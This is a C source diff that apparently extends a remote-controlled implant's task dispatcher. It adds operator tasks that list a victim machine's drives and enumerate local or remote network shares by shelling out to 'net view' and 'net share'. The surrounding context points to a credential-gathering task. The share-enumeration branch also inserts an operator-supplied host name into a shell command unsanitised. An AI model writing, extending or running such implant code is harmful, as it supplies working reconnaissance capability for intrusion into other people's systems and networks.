@@ -2086,6 +2086,74 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out ? out : "no credentials found", "");
         free(out);
     }
+    else if (strcmp(type_upper, "DRIVES") == 0) {
+        WCHAR buf[256] = {0};
+        DWORD ret = GetLogicalDriveStringsW(255, buf);
+        char json[2048] = {0};
+        strcat(json, "{\"cwd\":\"\",\"path\":\"\",\"drives\":true,\"entries\":[");
+        int first = 1;
+        for (DWORD i = 0; i < ret; ) {
+            if (buf[i] == 0) break;
+            DWORD j = i;
+            while (buf[j]) j++;
+            char drive[16] = {0};
+            WideCharToMultiByte(CP_UTF8, 0, buf + i, -1, drive, sizeof(drive)-1, NULL, NULL);
+            /* strip trailing backslash for cleaner display but keep it */
+            char ent[128];
+            snprintf(ent, sizeof(ent), "%s{\"name\":\"%s\",\"is_dir\":true,\"size\":0,\"mod\":\"\"}",
+                     first ? "" : ",", drive);
+            strncat(json, ent, sizeof(json) - strlen(json) - 1);
+            first = 0;
+            i = j + 1;
+        }
+        strcat(json, "]}");
+        agent_send_result(task->id, json, "");
+    }
+    else if (strcmp(type_upper, "NET_SHARES") == 0) {
+        char host[256] = {0};
+        /* args may be plain hostname or JSON {"host":"..."} */
+        if (args && args[0] == '{') {
+            json_get_str(args, "host", host, sizeof(host), "");
+        } else if (args && args[0]) {
+            const char *p = args;
+            while (*p == '\\' || *p == '/') p++;
+            strncpy(host, p, sizeof(host)-1);
+        }
+        char cmd[512];
+        if (host[0])
+            snprintf(cmd, sizeof(cmd), "net view \\\\%s /all 2>&1", host);
+        else
+            snprintf(cmd, sizeof(cmd), "net share 2>&1");
+        char *raw = run_shell(cmd);
+        if (!raw) { agent_send_result(task->id, "", "net_shares: run failed"); return; }
+        /* Parse output — entries follow the "---" separator line */
+        char json[8192] = {0};
+        strcat(json, "{\"cwd\":\"\",\"path\":\"\",\"entries\":[");
+        int first = 1, parsing = 0;
+        char *line = strtok(raw, "\n");
+        while (line) {
+            while (*line == '\r' || *line == ' ') line++;
+            if (strstr(line, "---")) { parsing = 1; line = strtok(NULL, "\n"); continue; }
+            if (!parsing || !line[0]) { line = strtok(NULL, "\n"); continue; }
+            /* stop at command-completed message */
+            char lc[256] = {0}; strncpy(lc, line, sizeof(lc)-1);
+            for (char *q = lc; *q; q++) *q = (char)tolower((unsigned char)*q);
+            if (strstr(lc, "command completed") || strstr(lc, "comando completado")) break;
+            /* first field is the share name */
+            char name[128] = {0}; int i = 0;
+            while (line[i] && !isspace((unsigned char)line[i]) && i < 127) { name[i] = line[i]; i++; }
+            if (!name[0]) { line = strtok(NULL, "\n"); continue; }
+            char ent[256];
+            snprintf(ent, sizeof(ent), "%s{\"name\":\"%s\",\"is_dir\":true,\"size\":0,\"mod\":\"\"}",
+                     first ? "" : ",", name);
+            strncat(json, ent, sizeof(json) - strlen(json) - 1);
+            first = 0;
+            line = strtok(NULL, "\n");
+        }
+        free(raw);
+        strcat(json, "]}");
+        agent_send_result(task->id, json, "");
+    }
     else {
         char err[128];
         snprintf(err, sizeof(err), "unknown task type: %s", task->type);
